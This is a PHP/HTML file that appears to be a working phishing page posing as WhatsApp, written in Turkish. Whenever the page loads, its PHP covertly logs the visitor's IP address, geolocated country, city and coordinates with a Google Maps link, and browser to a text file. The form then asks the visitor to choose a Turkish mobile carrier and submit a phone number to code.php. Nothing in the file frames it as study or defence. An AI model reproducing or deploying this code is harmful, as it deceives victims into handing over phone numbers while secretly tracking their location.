<?php 
date_default_timezone_set('Europe/Istanbul');
error_reporting(0); 
if (isset($_GET["id"])) {
	echo "<script>alert('İşleminiz gerçekleşti.');</script>";
}

else{
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}

$ip = $_SERVER["REMOTE_ADDR"];


$tarih =" Tarih : ".date('d/m/Y  H:i');


$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 

$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = " Ip Adresi : ".$adress;
$yamanefkar["1"] = " Ulke : ".$ulke; 
$yamanefkar["2"] = " Bolge : ".$bolge;
$yamanefkar["3"] = " Kita : ".$kita;
$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = " Sehir : ".$sehir;
$yamanefkar["6"] = " Plaka : ".$plaka;
$yamanefkar["7"] = " Enlem : ".$enlem;
$yamanefkar["8"] = " Boylam : ".$boylam;
$yamanefkar["9"] = " Google Maps : ".$maps;
$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 


$ac = fopen("kayit.txt","a+");

$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(1);

}

 ?>

<!doctype html>
<html lang="tr">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <title>Hoş Geldiniz</title>
  </head>
  <body style="background-image: url('http://www.allwhitebackground.com/images/7/WhatsApp-Background-High-Quality-Image.jpg');  background-repeat: no-repeat;
  background-attachment: fixed;
  background-position: center;height: 100%;width: 100%;" bgcolor="black">
  	<div class="container ">
  		<div class="row mt-5">
  		<div class="col-md-12 col-12">
  			<center>
  			<div class="card bg-dark col-12"  style="opacity: 0.9">
  				<div class="card-body">
  					<p class="text-danger font-weight-bold">Lütfen bilgilerinizi eksiksiz giriniz!</p>
  					<form method="POST" action="code.php">
  						<div class="form-row col-12">
  						<div class="form-group col-md-12 text-white pt-5">
  							<select class="form-control" required="">
  								<option>Turkcell</option>
  								<option>Vodofone</option>
  								<option>Turk Telekom</option>
  							</select>
  							</div>
  						</div>
  						<div class="form-row">
  							<div class="form-group col-md-12 text-white pt-1 ml-1">
  								<label>Telefon Numarası</label>
  								<input type="text" name="telnumber" class="form-control input-sm" required="" placeholder="+90" value="" minlength="11" maxlength="13" > 
  							</div>
  							<div class="form-row col-12">
  								<button type="submit" class="btn btn-outline-success  btn-block ">Devam</button>
  							</div>
  							
  						</div>
  					</form>
  				</div>
  			</div>
  		</div>	
  		</center>
  		</div>
  	</div>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>